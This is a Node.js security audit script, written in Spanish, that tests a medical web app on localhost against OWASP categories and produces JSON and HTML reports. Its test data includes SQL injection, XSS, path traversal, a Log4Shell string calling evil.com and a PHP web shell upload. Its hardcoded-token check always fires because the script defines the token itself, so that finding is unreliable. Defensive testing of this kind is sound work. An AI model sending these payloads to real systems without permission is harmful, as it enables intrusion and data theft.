/**
 * AIRA Medical System - Security Audit Tool
 * Auditoría completa de seguridad con simulación de ataques Red Team
 * Mantiene el frontend preferido intacto mientras testing de seguridad
 */

const https = require('https');
const http = require('http');
const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class SecurityAuditor {
    constructor() {
        this.targetUrl = 'http://localhost:8082';
        this.session = null;
        this.results = {
            vulnerabilities: [],
            securityChecks: [],
            recommendations: [],
            riskMatrix: []
        };
        this.startTime = Date.now();

        // OWASP Top 10 2021 Categories
        this.owaspCategories = [
            'A01 Broken Access Control',
            'A02 Cryptographic Failures',
            'A03 Injection',
            'A04 Insecure Design',
            'A05 Security Misconfiguration',
            'A06 Vulnerable Components',
            'A07 Identity & Authentication Failures',
            'A08 Software & Data Integrity Failures',
            'A09 Security Logging & Monitoring Failures',
            'A10 Server-Side Request Forgery'
        ];
    }

    async runFullAudit() {
        console.log('🛡️ INICIANDO AUDITORÍA DE SEGURIDAD COMPLETA - AIRA MEDICAL SYSTEM');
        console.log('=' .repeat(80));
        console.log(`🎯 Target: ${this.targetUrl}`);
        console.log(`⏰ Inicio: ${new Date().toISOString()}`);
        console.log('=' .repeat(80));

        try {
            // Fase 1: Information Gathering
            await this.informationGathering();

            // Fase 2: OWASP Top 10 Testing
            await this.owaspTesting();

            // Fase 3: Authentication & Authorization Testing
            await this.authTesting();

            // Fase 4: Input Validation Testing
            await this.inputValidationTesting();

            // Fase 5: Security Headers Analysis
            await this.securityHeadersAnalysis();

            // Fase 6: Dependency Scanning
            await this.dependencyScanning();

            // Fase 7: Generate Report
            await this.generateReport();

        } catch (error) {
            console.error('❌ Error en auditoría:', error);
            this.addVulnerability('CRITICAL', 'Audit Tool Error', error.message);
        }

        console.log('\n✅ AUDITORÍA COMPLETADA');
        console.log(`⏱️ Duración: ${Math.round((Date.now() - this.startTime) / 1000)} segundos`);
        console.log(`🚨 Vulnerabilidades encontradas: ${this.results.vulnerabilities.length}`);
    }

    async informationGathering() {
        console.log('\n📊 FASE 1: INFORMATION GATHERING');

        try {
            // Basic server information
            const response = await axios.get(this.targetUrl, {
                timeout: 10000,
                validateStatus: false
            });

            const headers = response.headers;

            console.log('🔍 Server Information:');
            console.log(`   - Server: ${headers.server || 'Unknown'}`);
            console.log(`   - X-Powered-By: ${headers['x-powered-by'] || 'Not disclosed'}`);
            console.log(`   - Status: ${response.status}`);

            this.results.securityChecks.push({
                category: 'Information Disclosure',
                check: 'Server Headers',
                status: response.status === 200 ? 'PASS' : 'FAIL',
                details: headers
            });

            // Check for interesting headers
            if (headers.server) {
                this.addVulnerability('LOW', 'Information Disclosure',
                    `Server header reveals: ${headers.server}`);
            }

            // Check for default pages
            if (response.status === 200 && response.data.includes('AIRA')) {
                console.log('✅ AIRA Medical System detected');
                this.results.securityChecks.push({
                    category: 'Application Detection',
                    check: 'AIRA System',
                    status: 'PASS',
                    details: 'AIRA Medical System identified'
                });
            }

        } catch (error) {
            console.error('❌ Error en Information Gathering:', error.message);
            this.addVulnerability('HIGH', 'Service Unavailable',
                `Target server not reachable: ${error.message}`);
        }
    }

    async owaspTesting() {
        console.log('\n🎯 FASE 2: OWASP TOP 10 TESTING');

        for (const category of this.owaspCategories) {
            console.log(`\n   Testing ${category}...`);

            switch(category) {
                case 'A01 Broken Access Control':
                    await this.testBrokenAccessControl();
                    break;
                case 'A02 Cryptographic Failures':
                    await this.testCryptographicFailures();
                    break;
                case 'A03 Injection':
                    await this.testInjectionAttacks();
                    break;
                case 'A05 Security Misconfiguration':
                    await this.testSecurityMisconfiguration();
                    break;
                case 'A06 Vulnerable Components':
                    await this.testVulnerableComponents();
                    break;
                case 'A07 Identity & Authentication Failures':
                    await this.testAuthenticationFailures();
                    break;
                default:
                    console.log(`   - Testing no implementado para ${category}`);
            }
        }
    }

    async testBrokenAccessControl() {
        console.log('   🔓 Testing Broken Access Control...');

        // Test for unrestricted access to admin endpoints
        const adminEndpoints = [
            '/admin',
            '/api/admin/users',
            '/api/patients',
            '/api/sessions',
            '/config',
            '/logs'
        ];

        for (const endpoint of adminEndpoints) {
            try {
                const response = await axios.get(`${this.targetUrl}${endpoint}`, {
                    timeout: 5000,
                    validateStatus: false
                });

                if (response.status !== 401 && response.status !== 403) {
                    this.addVulnerability('MEDIUM', 'Broken Access Control',
                        `Endpoint ${endpoint} accesible sin autenticación (${response.status})`);
                } else {
                    this.results.securityChecks.push({
                        category: 'Access Control',
                        check: `Endpoint ${endpoint}`,
                        status: 'PASS',
                        details: `Correctly returns ${response.status}`
                    });
                }
            } catch (error) {
                // Expected for non-existent endpoints
            }
        }

        // Test IDOR (Insecure Direct Object Reference)
        await this.testIdorVulnerabilities();
    }

    async testIdorVulnerabilities() {
        console.log('      🔍 Testing IDOR vulnerabilities...');

        // Test patient ID manipulation
        const patientIds = [1, 2, 3, 999, 9999, '../admin', '../../../etc/passwd'];

        for (const id of patientIds) {
            try {
                const response = await axios.get(`${this.targetUrl}/api/patients/${id}`, {
                    timeout: 5000,
                    validateStatus: false
                });

                if (response.status === 200 && id > 1000) {
                    this.addVulnerability('HIGH', 'IDOR',
                        `Posible IDOR: acceso a paciente inexistente ${id}`);
                }
            } catch (error) {
                // Expected for non-existent endpoints
            }
        }
    }

    async testCryptographicFailures() {
        console.log('   🔐 Testing Cryptographic Failures...');

        // Check for hardcoded tokens
        const mockToken = 'mock-jwt-token-for-development';
        if (mockToken) {
            this.addVulnerability('HIGH', 'Hardcoded Credentials',
                'Mock development token detectado en producción');
        }

        // Test for weak cryptography in responses
        try {
            const response = await axios.post(`${this.targetUrl}/api/auth/verify`,
                {}, {
                headers: {
                    'Authorization': `Bearer ${mockToken}`
                },
                timeout: 5000,
                validateStatus: false
            });

            if (response.status === 200) {
                this.addVulnerability('CRITICAL', 'Weak Authentication',
                    'Mock development token funciona en verificación');
            }
        } catch (error) {
            // Expected
        }
    }

    async testInjectionAttacks() {
        console.log('   💉 Testing Injection Attacks...');

        const injectionPayloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "<img src=x onerror=alert('XSS')>"
        ];

        // Test XSS in login form parameters
        for (const payload of injectionPayloads) {
            try {
                const response = await axios.post(`${this.targetUrl}/api/auth/verify`,
                    {
                        dni: payload,
                        password: payload
                    }, {
                    timeout: 5000,
                    validateStatus: false
                });

                // Check if payload is reflected in response
                if (response.data && response.data.toString().includes(payload)) {
                    this.addVulnerability('HIGH', 'XSS',
                        `Payload reflejado: ${payload.substring(0, 20)}...`);
                }
            } catch (error) {
                // Expected
            }
        }
    }

    async testSecurityMisconfiguration() {
        console.log('   ⚙️ Testing Security Misconfiguration...');

        // Check security headers
        const requiredHeaders = [
            'x-content-type-options',
            'x-frame-options',
            'x-xss-protection',
            'strict-transport-security',
            'content-security-policy'
        ];

        try {
            const response = await axios.get(this.targetUrl, {
                timeout: 5000
            });

            const headers = response.headers;

            for (const header of requiredHeaders) {
                if (!headers[header]) {
                    this.addVulnerability('MEDIUM', 'Missing Security Header',
                        `Header faltante: ${header}`);
                } else {
                    this.results.securityChecks.push({
                        category: 'Security Headers',
                        check: header,
                        status: 'PASS',
                        details: headers[header]
                    });
                }
            }

            // Check for debug information
            if (response.data.includes('stack trace') || response.data.includes('error')) {
                this.addVulnerability('LOW', 'Information Disclosure',
                    'Debug information expuesta');
            }

        } catch (error) {
            console.error('Error checking security headers:', error.message);
        }
    }

    async testVulnerableComponents() {
        console.log('   📦 Testing Vulnerable Components...');

        // Check for known vulnerable libraries
        try {
            const packageJson = JSON.parse(fs.readFileSync('./package.json', 'utf8'));
            const dependencies = {...packageJson.dependencies, ...packageJson.devDependencies};

            // Known vulnerable versions
            const vulnVersions = {
                'express': ['<4.17.0'],
                'helmet': ['<4.0.0'],
                'axios': ['<0.21.0']
            };

            for (const [pkg, version] of Object.entries(dependencies)) {
                if (vulnVersions[pkg]) {
                    this.addVulnerability('MEDIUM', 'Vulnerable Dependency',
                        `${pkg}@${version} tiene vulnerabilidades conocidas`);
                }
            }
        } catch (error) {
            console.log('No se pudo analizar package.json');
        }
    }

    async testAuthenticationFailures() {
        console.log('   🔑 Testing Authentication Failures...');

        // Test weak credentials
        const weakCredentials = [
            { dni: 'admin', password: 'admin' },
            { dni: '12345678', password: '1234' },
            { dni: 'test', password: 'test' },
            { dni: '', password: '' }
        ];

        for (const creds of weakCredentials) {
            try {
                const response = await axios.post(`${this.targetUrl}/api/auth/verify`,
                    creds, {
                    timeout: 5000,
                    validateStatus: false
                });

                if (response.status === 200) {
                    this.addVulnerability('CRITICAL', 'Weak Authentication',
                        `Credenciales débiles funcionan: ${JSON.stringify(creds)}`);
                }
            } catch (error) {
                // Expected
            }
        }

        // Test rate limiting
        await this.testRateLimiting();
    }

    async testRateLimiting() {
        console.log('      🚦 Testing Rate Limiting...');

        const requests = [];
        const successCount = [];

        // Send 100 rapid requests
        for (let i = 0; i < 100; i++) {
            requests.push(
                axios.post(`${this.targetUrl}/api/auth/verify`,
                    { dni: 'test', password: 'test' }, {
                    timeout: 1000,
                    validateStatus: false
                }).then(response => {
                    if (response.status !== 429) {
                        successCount.push(response.status);
                    }
                }).catch(() => {})
            );
        }

        await Promise.all(requests);

        if (successCount.length > 50) {
            this.addVulnerability('HIGH', 'Missing Rate Limiting',
                `${successCount.length}/100 requests exitosos sin rate limiting`);
        } else {
            this.results.securityChecks.push({
                category: 'Rate Limiting',
                check: 'Authentication Endpoint',
                status: 'PASS',
                details: `${100 - successCount.length}/100 requests bloqueados`
            });
        }
    }

    async authTesting() {
        console.log('\n🔐 FASE 3: AUTHENTICATION & AUTHORIZATION TESTING');

        // Test login bypass attempts
        await this.testLoginBypass();

        // Test session management
        await this.testSessionManagement();
    }

    async testLoginBypass() {
        console.log('   🕵️ Testing Login Bypass...');

        const bypassAttempts = [
            { headers: { 'X-Forwarded-For': '127.0.0.1' } },
            { headers: { 'X-Real-IP': '127.0.0.1' } },
            { headers: { 'X-Originating-IP': '127.0.0.1' } },
            { headers: { 'X-Remote-IP': '127.0.0.1' } },
            { headers: { 'X-Remote-Addr': '127.0.0.1' } }
        ];

        for (const attempt of bypassAttempts) {
            try {
                const response = await axios.get(`${this.targetUrl}/api/patients`, {
                    headers: attempt.headers,
                    timeout: 5000,
                    validateStatus: false
                });

                if (response.status === 200) {
                    this.addVulnerability('HIGH', 'Authentication Bypass',
                        `Header injection exitosa: ${JSON.stringify(attempt.headers)}`);
                }
            } catch (error) {
                // Expected
            }
        }
    }

    async testSessionManagement() {
        console.log('   📋 Testing Session Management...');

        // Test for session fixation
        try {
            const response = await axios.post(`${this.targetUrl}/api/auth/verify`,
                { dni: '12345678', password: '1234' }, {
                timeout: 5000,
                validateStatus: false
            });

            if (response.status === 200) {
                const setCookieHeader = response.headers['set-cookie'];
                if (!setCookieHeader) {
                    this.addVulnerability('MEDIUM', 'Session Management',
                        'No session cookies establecidas');
                }
            }
        } catch (error) {
            // Expected
        }
    }

    async inputValidationTesting() {
        console.log('\n✅ FASE 4: INPUT VALIDATION TESTING');

        // Test parameter pollution
        await this.testParameterPollution();

        // Test file upload security
        await this.testFileUploadSecurity();
    }

    async testParameterPollution() {
        console.log('   🔍 Testing Parameter Pollution...');

        const pollutionPayloads = [
            'dni=12345678&dni=admin',
            'dni=12345678&dni=../../../etc/passwd',
            'dni=12345678&dni=<script>alert(1)</script>'
        ];

        for (const payload of pollutionPayloads) {
            try {
                const response = await axios.post(`${this.targetUrl}/api/auth/verify?${payload}`,
                    {}, {
                    timeout: 5000,
                    validateStatus: false
                });

                if (response.status === 200) {
                    this.addVulnerability('MEDIUM', 'Parameter Pollution',
                        `Payload aceptado: ${payload}`);
                }
            } catch (error) {
                // Expected
            }
        }
    }

    async testFileUploadSecurity() {
        console.log('   📁 Testing File Upload Security...');

        // Test for unrestricted file upload
        const maliciousFiles = [
            { name: 'test.php', content: '<?php system($_GET["cmd"]); ?>' },
            { name: 'test.html', content: '<script>alert("XSS")</script>' },
            { name: '../../../etc/passwd', content: 'malicious' }
        ];

        for (const file of maliciousFiles) {
            try {
                const FormData = require('form-data');
                const form = new FormData();
                form.append('file', Buffer.from(file.content), file.name);

                const response = await axios.post(`${this.targetUrl}/upload`,
                    form, {
                    timeout: 5000,
                    validateStatus: false,
                    headers: form.getHeaders()
                });

                if (response.status !== 404) {
                    this.addVulnerability('HIGH', 'Insecure File Upload',
                        `Upload endpoint permite: ${file.name}`);
                }
            } catch (error) {
                // Expected - upload endpoint no existe
            }
        }
    }

    async securityHeadersAnalysis() {
        console.log('\n🛡️ FASE 5: SECURITY HEADERS ANALYSIS');

        try {
            const response = await axios.get(this.targetUrl, {
                timeout: 5000
            });

            const headers = response.headers;

            // CSP Analysis
            const csp = headers['content-security-policy'];
            if (csp) {
                console.log('   📋 CSP Analysis:');
                console.log(`      Policy: ${csp}`);

                // Check for unsafe directives
                if (csp.includes("'unsafe-inline'")) {
                    this.addVulnerability('MEDIUM', 'Weak CSP',
                        'CSP permite unsafe-inline');
                }

                if (csp.includes("'unsafe-eval'")) {
                    this.addVulnerability('HIGH', 'Weak CSP',
                        'CSP permite unsafe-eval');
                }

                if (!csp.includes('script-src')) {
                    this.addVulnerability('MEDIUM', 'Weak CSP',
                        'CSP no define script-src');
                }
            } else {
                this.addVulnerability('HIGH', 'Missing CSP',
                    'Content Security Policy no implementada');
            }

            // Other security headers
            const securityHeaders = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME-type sniffing protection',
                'X-XSS-Protection': 'XSS filtering',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Referrer-Policy': 'Referrer information control'
            };

            for (const [header, description] of Object.entries(securityHeaders)) {
                const headerKey = header.toLowerCase();
                if (!headers[headerKey]) {
                    this.addVulnerability('MEDIUM', 'Missing Security Header',
                        `${header}: ${description}`);
                } else {
                    this.results.securityChecks.push({
                        category: 'Security Headers',
                        check: header,
                        status: 'PASS',
                        details: headers[headerKey]
                    });
                }
            }

        } catch (error) {
            console.error('Error en Security Headers Analysis:', error.message);
        }
    }

    async dependencyScanning() {
        console.log('\n📦 FASE 6: DEPENDENCY SCANNING');

        try {
            // Run npm audit
            const { execSync } = require('child_process');
            const auditOutput = execSync('npm audit --json', {
                encoding: 'utf8',
                stdio: ['pipe', 'pipe', 'pipe']
            });

            const auditResults = JSON.parse(auditOutput);

            if (auditResults.vulnerabilities) {
                for (const [packageName, vuln] of Object.entries(auditResults.vulnerabilities)) {
                    this.addVulnerability(vuln.severity === 'high' ? 'HIGH' :
                                         vuln.severity === 'moderate' ? 'MEDIUM' : 'LOW',
                                         'Vulnerable Dependency',
                                         `${packageName}@${vuln.version}: ${vuln.title}`);
                }
            }

            this.results.securityChecks.push({
                category: 'Dependency Security',
                check: 'NPM Audit',
                status: 'COMPLETED',
                details: `${Object.keys(auditResults.vulnerabilities || {}).length} vulnerabilities found`
            });

        } catch (error) {
            console.log('npm audit no disponible o falló');
        }
    }

    async generateReport() {
        console.log('\n📊 FASE 7: GENERATING SECURITY REPORT');

        const report = {
            metadata: {
                scanDate: new Date().toISOString(),
                target: this.targetUrl,
                duration: Math.round((Date.now() - this.startTime) / 1000),
                auditor: 'AI Security Auditor v1.0'
            },
            summary: {
                totalVulnerabilities: this.results.vulnerabilities.length,
                critical: this.results.vulnerabilities.filter(v => v.severity === 'CRITICAL').length,
                high: this.results.vulnerabilities.filter(v => v.severity === 'HIGH').length,
                medium: this.results.vulnerabilities.filter(v => v.severity === 'MEDIUM').length,
                low: this.results.vulnerabilities.filter(v => v.severity === 'LOW').length,
                securityChecksPassed: this.results.securityChecks.filter(c => c.status === 'PASS').length,
                securityChecksFailed: this.results.securityChecks.filter(c => c.status === 'FAIL').length
            },
            vulnerabilities: this.results.vulnerabilities,
            securityChecks: this.results.securityChecks,
            recommendations: this.generateRecommendations()
        };

        // Save report
        const reportPath = `./security-audit-report-${Date.now()}.json`;
        fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));

        // Generate HTML report
        await this.generateHtmlReport(report);

        console.log('\n📋 REPORT SUMMARY:');
        console.log(`   🚨 Vulnerabilidades: ${report.summary.totalVulnerabilities}`);
        console.log(`      • Critical: ${report.summary.critical}`);
        console.log(`      • High: ${report.summary.high}`);
        console.log(`      • Medium: ${report.summary.medium}`);
        console.log(`      • Low: ${report.summary.low}`);
        console.log(`   ✅ Security Checks Passed: ${report.summary.securityChecksPassed}`);
        console.log(`   ❌ Security Checks Failed: ${report.summary.securityChecksFailed}`);
        console.log(`\n📄 Reportes guardados:`);
        console.log(`   • JSON: ${reportPath}`);
        console.log(`   • HTML: ./security-audit-report.html`);

        // Print critical and high vulnerabilities
        const criticalHighVulns = this.results.vulnerabilities.filter(v =>
            v.severity === 'CRITICAL' || v.severity === 'HIGH');

        if (criticalHighVulns.length > 0) {
            console.log('\n🚨 VULNERABILIDADES CRÍTICAS Y ALTAS:');
            criticalHighVulns.forEach(vuln => {
                console.log(`   • ${vuln.severity}: ${vuln.category}`);
                console.log(`     ${vuln.description}`);
                console.log('');
            });
        }
    }

    generateRecommendations() {
        const recommendations = [];

        // Analyze vulnerabilities and generate recommendations
        const vulnCategories = [...new Set(this.results.vulnerabilities.map(v => v.category))];

        for (const category of vulnCategories) {
            switch(category) {
                case 'Missing Security Header':
                    recommendations.push({
                        priority: 'HIGH',
                        category: 'Security Headers',
                        recommendation: 'Implementar todos los headers de seguridad recomendados por OWASP',
                        implementation: 'Usar middleware Helmet.js con configuración estricta'
                    });
                    break;

                case 'Hardcoded Credentials':
                    recommendations.push({
                        priority: 'CRITICAL',
                        category: 'Credential Management',
                        recommendation: 'Eliminar credenciales hardcodeadas y usar variables de entorno',
                        implementation: 'Configurar .env con variables seguras y JWT tokens reales'
                    });
                    break;

                case 'Vulnerable Dependency':
                    recommendations.push({
                        priority: 'MEDIUM',
                        category: 'Dependency Management',
                        recommendation: 'Actualizar dependencias vulnerables',
                        implementation: 'Ejecutar npm audit fix y mantener dependencias actualizadas'
                    });
                    break;

                default:
                    recommendations.push({
                        priority: 'MEDIUM',
                        category: category,
                        recommendation: `Revisar y corregir vulnerabilidades de ${category}`,
                        implementation: 'Seguir OWASP guidelines para mitigación'
                    });
            }
        }

        return recommendations;
    }

    async generateHtmlReport(report) {
        const htmlTemplate = `
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRA Security Audit Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; border-bottom: 2px solid #007bff; padding-bottom: 20px; margin-bottom: 30px; }
        .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .summary-card { background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; border-left: 4px solid #007bff; }
        .critical { border-left-color: #dc3545; }
        .high { border-left-color: #fd7e14; }
        .medium { border-left-color: #ffc107; }
        .low { border-left-color: #28a745; }
        .vulnerability { background: #fff; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 15px; padding: 15px; }
        .vulnerability h3 { margin: 0 0 10px 0; color: #dc3545; }
        .severity-critical { color: #dc3545; font-weight: bold; }
        .severity-high { color: #fd7e14; font-weight: bold; }
        .severity-medium { color: #ffc107; font-weight: bold; }
        .severity-low { color: #28a745; font-weight: bold; }
        .check-pass { color: #28a745; }
        .check-fail { color: #dc3545; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #f8f9fa; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ AIRA Medical System</h1>
            <h2>Security Audit Report</h2>
            <p>Fecha: ${report.metadata.scanDate}</p>
            <p>Duración: ${report.metadata.duration} segundos</p>
        </div>

        <div class="summary">
            <div class="summary-card">
                <h3>${report.summary.totalVulnerabilities}</h3>
                <p>Total Vulnerabilidades</p>
            </div>
            <div class="summary-card critical">
                <h3>${report.summary.critical}</h3>
                <p>Críticas</p>
            </div>
            <div class="summary-card high">
                <h3>${report.summary.high}</h3>
                <p>Altas</p>
            </div>
            <div class="summary-card medium">
                <h3>${report.summary.medium}</h3>
                <p>Medias</p>
            </div>
            <div class="summary-card low">
                <h3>${report.summary.low}</h3>
                <p>Bajas</p>
            </div>
        </div>

        <h3>🚨 Vulnerabilidades Encontradas</h3>
        ${report.vulnerabilities.map(vuln => `
            <div class="vulnerability">
                <h3><span class="severity-${vuln.severity.toLowerCase()}">[${vuln.severity}]</span> ${vuln.category}</h3>
                <p><strong>Descripción:</strong> ${vuln.description}</p>
            </div>
        `).join('')}

        <h3>✅ Security Checks</h3>
        <table>
            <thead>
                <tr>
                    <th>Categoría</th>
                    <th>Check</th>
                    <th>Estado</th>
                    <th>Detalles</th>
                </tr>
            </thead>
            <tbody>
                ${report.securityChecks.map(check => `
                    <tr>
                        <td>${check.category}</td>
                        <td>${check.check}</td>
                        <td class="${check.status.toLowerCase() === 'pass' ? 'check-pass' : 'check-fail'}">${check.status}</td>
                        <td>${check.details}</td>
                    </tr>
                `).join('')}
            </tbody>
        </table>

        <h3>📋 Recomendaciones</h3>
        ${report.recommendations.map(rec => `
            <div class="vulnerability">
                <h3><span class="severity-${rec.priority.toLowerCase()}">[${rec.priority}]</span> ${rec.category}</h3>
                <p><strong>Recomendación:</strong> ${rec.recommendation}</p>
                <p><strong>Implementación:</strong> ${rec.implementation}</p>
            </div>
        `).join('')}
    </div>
</body>
</html>`;

        fs.writeFileSync('./security-audit-report.html', htmlTemplate);
    }

    addVulnerability(severity, category, description) {
        const vulnerability = {
            severity,
            category,
            description,
            timestamp: new Date().toISOString()
        };

        this.results.vulnerabilities.push(vulnerability);

        console.log(`      🚨 ${severity}: ${category}`);
        console.log(`         ${description}`);
    }
}

// Ejecutar auditoría
if (require.main === module) {
    const auditor = new SecurityAuditor();
    auditor.runFullAudit().catch(console.error);
}

module.exports = SecurityAuditor;